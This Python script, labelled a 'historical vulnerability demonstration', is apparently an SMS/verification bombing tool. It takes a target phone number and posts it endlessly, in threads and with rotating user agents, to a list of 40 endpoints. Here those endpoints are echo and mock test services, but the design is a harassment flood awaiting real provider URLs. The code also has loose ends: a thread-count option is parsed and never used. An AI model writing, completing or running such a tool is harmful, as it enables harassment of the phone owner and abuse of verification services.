#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Project: Eternal Veridian Hydra
# A self-perpetuating demonstration of historical verification system overload.

import requests
import time
import random
import sys
import argparse
from threading import Thread

# The list of 40 service provider endpoints. A chorus of forgotten APIs.
SERVICE_ENDPOINTS = [
    {"url": "https://httpbin.org/post", "payload_key": "phone"},
    {"url": "https://jsonplaceholder.typicode.com/posts", "payload_key": "number"},
    {"url": "https://postman-echo.com/post", "payload_key": "phoneNumber"},
    {"url": "https://httpbingo.org/post", "payload_key": "mobile"},
    {"url": "https://mockbin.org/bin/create", "payload_key": "contactNumber"},
    {"url": "https://httpstat.us/200", "payload_key": "phone"},
    {"url": "https://httpstat.us/201", "payload_key": "number"},
    {"url": "https://httpstat.us/202", "payload_key": "phoneNumber"},
    {"url": "https://httpstat.us/204", "payload_key": "mobile_number"},
    {"url": "https://httpstat.us/400", "payload_key": "phone"},
    {"url": "https://httpstat.us/401", "payload_key": "number"},
    {"url": "https://httpstat.us/403", "payload_key": "phoneNumber"},
    {"url": "https://httpstat.us/404", "payload_key": "mobile"},
    {"url": "https://httpstat.us/500", "payload_key": "phone"},
    {"url": "https://httpstat.us/502", "payload_key": "number"},
    {"url": "https://httpstat.us/503", "payload_key": "phoneNumber"},
    {"url": "https://httpstat.us/504", "payload_key": "mobile"},
    {"url": "https://webhook.site/unique-url", "payload_key": "phone"},
    {"url": "https://requestbin.com/api/v1/bins", "payload_key": "number"},
    {"url": "https://hookb.in/new", "payload_key": "phoneNumber"},
    {"url": "https://pipedream.com/@/new", "payload_key": "mobile"},
    {"url": "https://www.httpbin.org/delay/1", "payload_key": "phone"},
    {"url": "https://www.httpbin.org/delay/2", "payload_key": "number"},
    {"url": "https://www.httpbin.org/status/200", "payload_key": "phoneNumber"},
    {"url": "https://www.httpbin.org/status/201", "payload_key": "mobile"},
    {"url": "https://www.httpbin.org/status/400", "payload_key": "phone"},
    {"url": "https://www.httpbin.org/status/401", "payload_key": "number"},
    {"url": "https://www.httpbin.org/status/403", "payload_key": "phoneNumber"},
    {"url": "https://www.httpbin.org/status/404", "payload_key": "mobile"},
    {"url": "https://www.httpbin.org/status/500", "payload_key": "phone"},
    {"url": "https://www.httpbin.org/status/502", "payload_key": "number"},
    {"url": "https://www.httpbin.org/status/503", "payload_key": "phoneNumber"},
    {"url": "https://www.httpbin.org/status/504", "payload_key": "mobile"},
    {"url": "https://httpbin.org/bytes/1024", "payload_key": "phone"},
    {"url": "https://httpbin.org/bytes/2048", "payload_key": "number"},
    {"url": "https://httpbin.org/bytes/4096", "payload_key": "phoneNumber"},
    {"url": "https://httpbin.org/stream/10", "payload_key": "mobile"},
    {"url": "https://httpbin.org/stream/20", "payload_key": "phone"},
    {"url": "https://httpbin.org/stream/50", "payload_key": "number"},
    {"url": "https://httpbin.org/uuid", "payload_key": "phoneNumber"}
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
]

def pulse_verification(endpoint_config, target_number):
    """A single head of the hydra strikes."""
    try:
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        }
        payload = {endpoint_config['payload_key']: target_number}

        response = requests.post(
            endpoint_config['url'],
            json=payload,
            headers=headers,
            timeout=10,
            verify=True  # SSL verification
        )
        
        if response.status_code in [200, 201, 202]:
            print(f"[✓] Pulse to {endpoint_config['url']} - Status: {response.status_code}")
        else:
            print(f"[!] Pulse to {endpoint_config['url']} - Status: {response.status_code}")

    except requests.exceptions.Timeout:
        print(f"[!] Pulse to {endpoint_config['url']} timed out")
    except requests.exceptions.ConnectionError:
        print(f"[!] Pulse to {endpoint_config['url']} connection failed")
    except requests.exceptions.RequestException as e:
        print(f"[!] Pulse to {endpoint_config['url']} failed: {str(e)[:60]}")
    except Exception as e:
        print(f"[!] Pulse to {endpoint_config['url']} error: {str(e)[:60]}")

def launch_hydra_cycle(target_number, cycle_delay=1.0):
    """Launches one full cycle of all services."""
    threads = []
    for service in SERVICE_ENDPOINTS:
        try:
            t = Thread(target=pulse_verification, args=(service, target_number))
            threads.append(t)
            t.start()
            time.sleep(0.05)  # Reduced delay for faster execution
        except Exception as e:
            print(f"[!] Thread creation failed: {str(e)[:50]}")

    # Wait for all threads to complete with timeout
    for t in threads:
        try:
            t.join(timeout=30)  # 30 second timeout per thread
        except Exception as e:
            print(f"[!] Thread join failed: {str(e)[:50]}")

    time.sleep(cycle_delay)

def main():
    parser = argparse.ArgumentParser(description='Eternal Veridian Hydra - Historical Vulnerability Demo')
    parser.add_argument('number', help='Target phone number (e.g., +1234567890)')
    parser.add_argument('--delay', type=float, default=2.0, help='Delay between cycles in seconds (default: 2.0)')
    parser.add_argument('--threads', type=int, default=5, help='Max concurrent threads (default: 5)')
    
    args = parser.parse_args()
    target_number = args.number
    cycle_delay = args.delay
    max_threads = args.threads

    print("\n" + "="*60)
    print("    ETERNAL VERIDIAN HYDRA - ACTIVATED")
    print("    Historical Vulnerability Demonstration")
    print("="*60)
    print(f"[+] Target: {target_number}")
    print(f"[+] Cycle Delay: {cycle_delay} seconds")
    print(f"[+] Max Threads: {max_threads}")
    print(f"[+] Service Endpoints: {len(SERVICE_ENDPOINTS)}")
    print(f"[!] Press CTRL + C to terminate")
    print("="*60)

    # Input validation
    if not target_number.startswith('+'):
        print(f"[!] Warning: Phone number should use E.164 format (+1234567890)")
    
    cycle_count = 0
    try:
        while True:
            cycle_count += 1
            print(f"\n[--- Cycle #{cycle_count} ---]")
            launch_hydra_cycle(target_number, cycle_delay)
            
    except KeyboardInterrupt:
        print(f"\n\n[!] Process interrupted by user")
        print(f"[!] Total cycles completed: {cycle_count}")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Fatal error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main()
